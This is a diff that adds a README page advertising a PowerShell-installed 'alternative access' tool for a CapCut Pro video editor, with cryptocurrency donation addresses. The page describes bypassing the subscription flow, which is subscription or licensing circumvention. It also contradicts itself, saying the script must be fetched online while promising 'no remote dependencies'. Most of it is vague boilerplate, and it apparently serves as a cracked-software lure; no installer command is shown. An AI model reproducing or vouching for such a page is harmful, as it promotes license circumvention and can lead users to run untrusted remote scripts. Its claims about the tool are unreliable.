@@ -1,0 +1,96 @@
+Capcut Pro Banorin Video Editor — Alternative Access
+
+💻 PowerShell Installer
+
+Support this project
+
+BTC:&nbsp;1PDPzygjwWpJvi3VazN34tjLstYkAzqxwA | TRON:&nbsp;TQndCpvGRR99qqJQLBgztFuuWwg3Ana9kq
+
+Capcut Pro Banorin Video Editor is a self-contained alternative access tool engineered around deterministic resource handling and a stable execution model. The implementation prioritizes a low-overhead processing pipeline that maintains consistent behavior across supported environments while preserving the integrity of each editing operation. Configuration is resolved through an explicit, auditable path so that runtime behavior remains predictable and reproducible. The tool is structured to operate independently, with all required components resolved internally rather than delegated to ambient system state.
+
+📋 System Requirements
+
+- PowerShell 5.1+ (pre-installed on Windows 10 and 11)
+- Windows 10 / 11 (x64)
+- Internet connection — required to fetch the script
+- Administrator — not required
+
+Features
+
+- Direct project access — Operates on the Capcut Pro Banorin Video Editor directly, applying configuration and state changes at the project level without requiring intermediate conversion steps or external tooling.
+
+- Deterministic configuration application — Reads and writes the editor's own configuration surface, so settings resolve predictably across sessions and environments.
+
+- Local-first operation — All processing is performed against the local installation; no remote dependencies are introduced into the workflow.
+
+- Scoped, reversible changes — Modifications are applied within defined boundaries of the target project, with the ability to inspect and revert state changes when needed.
+
+- Compatibility-aware behavior — Detects the installed version of Capcut Pro Banorin Video Editor and adjusts its handling accordingly, avoiding assumptions about a fixed layout.
+
+- Structured feedback — Emits clear, machine-readable status output for each operation, making it straightforward to script, log, or integrate into existing pipelines.
+
+- Non-invasive integration — Works alongside the editor's normal operation rather than replacing it, so existing projects and workflows remain intact.
+
+How it works
+
+The editor is delivered as a self-contained desktop application that runs locally on the user's machine. Upon launch, it initializes its own rendering pipeline and media engine, independent of any cloud dependency, so project files, assets, and export jobs stay on the local system.
+
+Internally, the application separates editing operations from rendering work. The timeline, effects, transitions, and keyframe data are stored in a structured project format, while the preview engine decodes source media through hardware-accelerated paths where available. This split allows the interface to remain responsive during heavy compositing and lets long export jobs run in a dedicated worker process without blocking the editing session.
+
+The tool exposes a configuration layer for engine preferences, such as decoder choice, cache location, and render thread allocation. These settings are read at startup and applied per-project, so users can tune behavior for different hardware profiles or asset types without altering the application itself.
+
+Media import and export are handled by an internal codec abstraction. Supported formats are probed at import time, and the export module selects an appropriate encoder based on the target container and the capabilities detected on the host system. Exported files are written directly to the chosen output directory with no intermediate upload step.
+
+Project state is persisted incrementally, with autosave checkpoints stored alongside the working project file. On restart, the application reconciles the latest checkpoint with the project manifest, allowing recovery of in-progress edits without manual file management.
+
+The application does not require an account or network connection for its core editing and export functions. Optional components, such as asset libraries or update checks, are optional modules that can be disabled in configuration, keeping the tool fully functional in offline or restricted environments.
+
+Modules and Settings
+
+Alternate Entry Point
+This module controls how the editing workspace is reached, letting you start a session through the project's alternative route instead of the conventional subscription flow. Each option is applied before the editor is brought up, so the workspace opens in the state you selected.
+
+- Entry method selects which access route the session uses and determines what you see once the editor loads.
+- Pre-launch access options adjust session behavior and are locked in at startup rather than mid-session.
+- Startup confirmation shows a summary of the chosen entry setup so you can review it before continuing.
+- Fallback option lets you return to the entry screen if the workspace does not open as expected.
+
+Project Asset Inspection
+This module provides a browsable view of the templates, presets and bundled resources the project depends on, so you can see what is available before committing anything to a session. It pairs with template loading: you inspect here, then load from the same asset pool.
+
+- Type filter narrows the listing to templates, presets or bundled resources.
+- Name sorting reorders the view alphabetically so specific assets are easier to find.
+- Asset details show what a selected item contains, helping you decide whether it suits the current project.
+- Selection hand-off marks an asset so it is carried into the loading step without searching again.
+
+Preset and Template Loading
+This module brings assets chosen during inspection into the current project. It turns a reviewed asset into a working starting point on the timeline.
+
+- Preset picker chooses from the available presets and applies the selected one to the project.
+- Partial application lets you choose which parts of a template are applied, so only the structure you want is inserted.
+- Timeline placement sets where the loaded template begins within the existing project.
+- Post-load review shows the resulting project structure so you can confirm the load before making further changes.
+
+Parameter and Render Options
+This module gathers the project parameters and export-related options exposed by the editor in one place, so adjustments happen before rendering rather than during it. Changes made here feed directly into the session state shown in the log.
+
+- Export options adjust output-related settings and update the project state as each change is made.
+- Effect settings tune the effects exposed by the editor and show the updated configuration immediately.
+- Configuration summary presents the current setup before you apply or render, so nothing is committed unseen.
+- Reset control returns parameters to the state of the active access profile.
+
+Access Profile Management
+This module stores groups of entry settings as profiles, so a working configuration can be reused instead of rebuilt. Profiles connect to the entry module by supplying the settings applied at startup.
+
+- Profile creation saves the current entry settings as a named profile.
+- Profile editing updates a stored profile without recreating it from scratch.
+- Active profile selection determines which profile's options are applied when a session begins.
+- Profile removal deletes profiles that are no longer needed while leaving others intact.
+
+Session Logging and Review
+This module records what options were selected and what actions were taken during each session, giving you a record to consult when repeating a configuration. The record complements profiles: a log entry shows what a session actually used, while a profile stores what you want reused.
+
+- Log filtering by session or action type narrows the record to the entries you need.
+- Session detail view shows the options and actions associated with a single session.
+
+…（内容已截断）
